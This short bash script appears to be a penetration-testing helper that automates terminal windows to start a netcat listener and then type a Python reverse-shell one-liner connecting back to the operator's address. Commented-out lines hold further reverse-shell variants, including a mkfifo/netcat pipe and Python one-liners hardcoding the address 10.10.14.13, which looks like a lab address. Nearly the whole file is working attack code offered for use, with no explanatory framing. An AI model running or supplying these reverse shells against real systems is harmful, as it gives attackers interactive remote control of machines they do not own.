#!/bin/bash

source "/opt/pmp/functions.sh"

PORT=$(($RANDOM+3000))

hide_guake
terminator
sleep 0.5
command "nc -lnvp $PORT"
alt_tab
command "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$IP\",$PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);  os.dup2(s.fileno(),2);os.system(\"/bin/sh -i\")'"

# command "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $PORT >/tmp/f"

# python -c 'import socket,os; s=socket.socket(); s.connect(("10.10.14.13",15156));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);  os.dup2(s.fileno(),2);os.system("/bin/sh -i")';
# python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.13",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'